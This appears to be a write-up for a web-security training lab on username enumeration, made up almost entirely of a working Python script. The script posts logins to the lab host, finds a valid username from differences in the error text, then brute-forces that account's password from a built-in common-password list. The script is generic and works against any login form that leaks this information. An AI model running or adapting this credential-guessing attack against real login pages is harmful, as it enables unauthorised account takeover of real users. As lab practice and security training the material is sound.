# Username enumeration via different responses

> This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password
> To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

```python
import requests
import sys

# Configuration
BASE_URL = "https://0ae600a2031ad3ec81f5d987008400d9.web-security-academy.net/"
LOGIN_ENDPOINT = f"{BASE_URL}login"

# Payloads
USERNAMES = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", 
    "user", "administrator", "oracle", "ftp", "pi", "puppet", "ansible", 
    "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", 
    "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", 
    "admin", "administracion", "administrador", "administrator", 
    "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", 
    "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", 
    "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque", 
    "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", 
    "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", 
    "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application", 
    "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight", 
    "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", 
    "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction", 
    "austin", "auth", "auto", "autodiscover"
]

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", 
    "1234", "111111", "1234567", "dragon", "123123", "baseball", 
    "abc123", "football", "monkey", "letmein", "shadow", "master", 
    "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", 
    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", 
    "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", 
    "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", 
    "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", 
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", 
    "starwars", "klaster", "112233", "george", "computer", "michelle", 
    "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", 
    "131313", "freedom", "777777", "pass", "maggie", "159753", 
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", 
    "summer", "love", "ashley", "nicole", "chelsea", "biteme", 
    "matthew", "access", "yankees", "987654321", "dallas", "austin", 
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", 
    "monitoring", "montana", "moon", "moscow"
]

def execute_attack():
    session = requests.Session()
    target_username = None

    # 1. Phase One: Username Enumeration
    print("[*] ENUMERATING USERNAMES...")
    for user in USERNAMES:
        auth_payload = {
            "username": user,
            "password": "dummy_password"
        }
        
        response = session.post(LOGIN_ENDPOINT, data=auth_payload)
        
        sys.stdout.write(f"\r[*] Checking Username: {user}{' ' * 10}")
        sys.stdout.flush()
        
        # Using break instead of return to allow Phase 2 to execute
        if "Invalid username" not in response.text:
            print(f"\n[+] VALID USERNAME IDENTIFIED: {user}")
            target_username = user
            break
            
    if not target_username:
        print("\n[-] Enumeration failed. No valid username found.")
        return

    # 2. Phase Two: Password Brute-Force
    print("\n[*] INITIATING PASSWORD BRUTE-FORCE...")
    for pwd in PASSWORDS:
        auth_payload = {
            "username": target_username,
            "password": pwd
        }
        
        response = session.post(LOGIN_ENDPOINT, data=auth_payload)
        
        sys.stdout.write(f"\r[*] Checking Password: {pwd}{' ' * 10}")
        sys.stdout.flush()
        
        if "Log out" in response.text:
            print(f"\n[+] BRUTE-FORCE SUCCESSFUL | Credentials -> {target_username}:{pwd}")
            return
            
    print("\n[-] Brute-force failed. No valid password found.")

if __name__ == "__main__":
    execute_attack()
```